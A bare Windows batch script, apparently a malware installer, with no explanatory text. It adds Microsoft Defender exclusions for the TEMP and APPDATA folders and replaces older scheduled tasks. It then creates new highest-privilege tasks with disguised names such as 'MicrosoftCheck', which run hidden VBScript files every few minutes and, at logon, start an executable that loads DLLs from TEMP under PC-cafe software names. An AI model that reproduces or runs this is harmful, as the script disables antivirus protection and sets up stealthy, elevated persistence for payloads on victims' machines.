@echo off

powershell -c Add-MpPreference -ExclusionPath "%temp%"
powershell -c Add-MpPreference -ExclusionPath "%APPDATA%"
schtasks /delete /tn "auto_by_task" /f
schtasks /delete /tn "InstallRequests" /f
schtasks /delete /tn "RunPowerShellScript" /f
schtasks /create /tn "MicrosoftCheck" /sc minute /mo 6 /tr "wscript.exe \"%APPDATA%\microsoftcheck.vbs\"" /rl HIGHEST /f
schtasks /delete /tn "TempVBS" /f
schtasks /create /tn "TempVBS2" /sc minute /mo 5 /tr "\"%SystemRoot%\System32\wscript.exe\" //e:vbscript //b \"%TEMP%\ddd.vbs\"" /rl HIGHEST /f
schtasks /create /tn "PncserverDiag" /tr "%temp%\Pancafediag.exe pncserver.exe %temp%\PncDiag.dll" /sc onlogon /rl highest /f
schtasks /create /tn "CafePlusDiag" /tr "%temp%\Pancafediag.exe CafePlus.exe %temp%\CafePlusdll.dll" /sc onlogon /rl highest /f





